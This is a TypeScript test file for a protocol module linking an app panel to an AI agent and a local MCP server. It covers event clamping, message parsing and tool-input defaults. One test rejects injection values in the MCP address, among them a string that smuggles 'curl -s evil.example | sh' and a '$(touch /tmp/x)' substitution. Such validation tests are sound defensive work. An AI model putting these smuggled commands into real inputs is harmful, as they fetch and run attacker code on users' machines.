import { describe, expect, it } from 'bun:test';
import { agentEventSchema, clampEvent, parseMessage, parseToolInput, bridgeMessageSchema } from './protocol';

describe('agent events', () => {
  it('are cut to what the app accepts, so none is dropped', () => {
    const long = 'x'.repeat(10_000);
    for (const event of [
      { type: 'done', ok: false, error: long },
      { type: 'tool', tool: long, summary: long },
      { type: 'text', text: 'y'.repeat(200_000) },
      { type: 'started', model: long },
    ] as const) {
      expect(agentEventSchema.safeParse(clampEvent(event)).success).toBe(true);
    }
    expect(clampEvent({ type: 'done', ok: true, turns: 2 })).toEqual({ type: 'done', ok: true, turns: 2 });
  });
});

describe('messages and tool input', () => {
  it('reads only well-formed messages', () => {
    expect(parseMessage(bridgeMessageSchema, '{"kind":"agent","event":{"type":"text","text":"hi"}}')).toEqual({ kind: 'agent', event: { type: 'text', text: 'hi' } });
    expect(parseMessage(bridgeMessageSchema, '{"kind":"nope"}')).toBeNull();
    expect(parseMessage(bridgeMessageSchema, '{')).toBeNull();
  });

  it('takes only a plain local address for the MCP server, as the panel shows it as a command to copy', () => {
    const hello = (mcp: string) => JSON.stringify({ kind: 'hello', version: '1', agent: { available: true, name: 'A' }, mcp });
    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:7425/mcp'))).toMatchObject({ mcp: 'http://127.0.0.1:7425/mcp' });
    expect(parseMessage(bridgeMessageSchema, hello('http://localhost:50123/mcp'))).not.toBeNull();
    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:1/mcp; curl -s evil.example | sh #'))).toBeNull();
    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:1/mcp$(touch /tmp/x)'))).toBeNull();
    expect(parseMessage(bridgeMessageSchema, hello('https://evil.example/mcp'))).toBeNull();
  });

  it('fills in defaults and explains bad input', () => {
    expect(parseToolInput('undo', undefined)).toEqual({ ok: true, value: { steps: 1 } });
    expect(parseToolInput('undo', { steps: 0 })).toMatchObject({ ok: false, error: expect.stringContaining('steps:') });
  });
});
